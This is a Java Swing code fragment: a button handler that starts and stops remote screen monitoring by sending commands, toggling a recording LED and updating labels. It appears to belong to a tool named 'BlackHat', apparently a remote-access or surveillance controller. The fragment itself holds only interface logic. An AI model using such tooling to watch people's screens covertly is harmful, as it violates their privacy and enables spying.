    private void reCreatePanel() {
        Command.KEY_SCREEN_MONITOR = false;
        this.MainClass.Screen_Video_Monitor();
    }
    private void jToggleButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jToggleButton1ActionPerformed
        try {
            if (jToggleButton1.isSelected()) {
                if (!Command.KEY_SCREEN_MONITOR) {
                    this.MainClass.Connect(Command.SCREEN_MONITOR);
                    Screen(true);
                    reclad.setLedOn(true);
                    reclad.setLedBlinking(true);
                    jLabel1.setText(blackhat.BlackHat.local.getString("lblRecording"));
                    jToggleButton1.setText(blackhat.BlackHat.local.getString("btnStopRecord"));
                    jPanel1.setEnabled(true);
                } else {
                    ResevedScreen();
                    reclad.setLedOn(true);
                    reclad.setLedBlinking(true);
                    jLabel1.setText(blackhat.BlackHat.local.getString("lblRecording"));
                    jToggleButton1.setText(blackhat.BlackHat.local.getString("btnStopRecord"));
                    jPanel1.setEnabled(true);
                }
            } else if (Command.KEY_SCREEN_MONITOR) {
                if (Screen != null) {
                    this.MainClass.Connect(Command.STOP_SCREEN_MONITOR);
                    Command.KEY_SCREEN_MONITOR = false;
                    Screen(false);
                    reclad.setLedBlinking(false);
                    reclad.setLedOn(false);
                    jLabel1.setText(blackhat.BlackHat.local.getString("lblRecordingStop"));
                    jToggleButton1.setText(blackhat.BlackHat.local.getString("btnStartRecord"));
                    jPanel1.removeAll();
                    jPanel1.updateUI();
                    jPanel1.setEnabled(false);
                    jPanel1 = null;
                    reCreatePanel();
                };
            }
        } catch (IOException ex) {
            RestartScreen();
        }
    }//GEN-LAST:event_jToggleButton1ActionPerformed

